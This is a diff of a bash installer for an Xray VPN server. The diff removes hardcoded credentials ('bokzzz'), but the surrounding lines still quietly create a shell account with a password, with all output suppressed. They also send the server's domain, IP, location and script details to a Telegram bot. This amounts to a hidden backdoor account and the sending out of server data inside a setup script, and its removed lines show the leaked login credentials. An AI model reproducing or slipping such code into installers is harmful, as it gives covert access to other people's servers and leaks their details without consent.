@@ -161,12 +161,10 @@ echo -e "$green━━━━━━━━━━━━━━━━━━━━━�
         echo "$nsdomen" > /etc/xray/nsdomain
         echo "$nsdomen" > /root/nsdomain
 fi
-domain=$(cat /root/domain)
+dom=$(cat /root/domain)
 CITY=$(curl -s ipinfo.io/city )
 WKT=$(curl -s ipinfo.io/timezone )
 userdel jame > /dev/null 2>&1
-Username="bokzzz"
-Password=bokzzz
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
@@ -177,10 +175,8 @@ TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="Installasi script v6 By Raden Rizki Kontol 
 ============================
-<code>Domain     :</code> <code>$domain</code>
+<code>Domain     :</code> <code>$dom</code>
 <code>IP Vps     :</code> <code>$IPVPS</code>
-<code>User Login :</code> <code>bok</code>
-<code>Pass Login :</code> <code>bok</code>
 <code>User Script:</code> <code>$Name</code>
 <code>Exp Script :</code> <code>$Exp</code>
 <code>Location   :</code> <code>$CITY</code>
